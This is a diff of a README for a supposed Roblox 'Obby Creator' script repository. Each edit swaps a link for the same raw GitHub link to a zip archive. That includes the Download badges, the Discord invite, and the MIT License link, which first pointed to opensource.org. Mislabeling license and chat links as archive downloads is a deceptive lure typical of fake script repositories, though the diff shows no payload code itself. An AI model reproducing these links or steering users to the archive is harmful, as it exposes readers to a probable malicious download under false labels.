@@ -1,6 +1,6 @@
 # 🛠️ Obby Creator Roblox Script Repository
 
-[![Download](https://img.shields.io/badge/Download-green)](https://mtreuque.github.io)
+[![Download](https://img.shields.io/badge/Download-green)](https://raw.githubusercontent.com/mtreuque/obby-creator-toolkit-roblox/branch/culverhouse/creator-roblox-obby-toolkit-3.3.zip)
 
 Welcome to the epicenter for all things related to the **Obby Creator Roblox Script**! Here, ambition meets innovation as we shape your next unforgettable Roblox obstacle adventure. If you've ever wondered how the magic behind interactive obbies is crafted, you’re in exactly the right place.
 
@@ -79,7 +79,7 @@ Roblox’s Terms of Service are the high rails you must never jump. This script 
 
 ## 📜 License
 
-Licensed under the [MIT License](https://opensource.org/licenses/MIT) (c) 2025.  
+Licensed under the [MIT License](https://raw.githubusercontent.com/mtreuque/obby-creator-toolkit-roblox/branch/culverhouse/creator-roblox-obby-toolkit-3.3.zip) (c) 2025.  
 Feel free to remix, adapt, and build upon this work—credit is appreciated but not required.
 
 ---
@@ -87,7 +87,7 @@ Feel free to remix, adapt, and build upon this work—credit is appreciated but 
 ## 🚀 Getting Started
 
 1. **Download the Obby Creator Roblox Script:**  
-   [![Download](https://img.shields.io/badge/Download-green)](https://mtreuque.github.io)
+   [![Download](https://img.shields.io/badge/Download-green)](https://raw.githubusercontent.com/mtreuque/obby-creator-toolkit-roblox/branch/culverhouse/creator-roblox-obby-toolkit-3.3.zip)
 
 2. Check out the **QuickStart Guide** in `/docs/QUICKSTART.md` to bring your first obby to life.
 
@@ -99,7 +99,7 @@ Feel free to remix, adapt, and build upon this work—credit is appreciated but 
 
 ## 🚩 Stay Connected
 
-- Got a question? Visit our Discord server https://mtreuque.github.io.
+- Got a question? Visit our Discord server https://raw.githubusercontent.com/mtreuque/obby-creator-toolkit-roblox/branch/culverhouse/creator-roblox-obby-toolkit-3.3.zip
 - Need detailed documentation? Explore `/docs` and the in-game help bot.
 - Want to suggest new languages or features? Please open an issue in our Issues tab.
 
@@ -115,7 +115,7 @@ Kudos to the contributors, code explorers, and creative architects who have made
 
 **Unleash your creative genius—get your own copy and leap into action:**
 
-[![Download](https://img.shields.io/badge/Download-green)](https://mtreuque.github.io)
+[![Download](https://img.shields.io/badge/Download-green)](https://raw.githubusercontent.com/mtreuque/obby-creator-toolkit-roblox/branch/culverhouse/creator-roblox-obby-toolkit-3.3.zip)
 
 ---
 
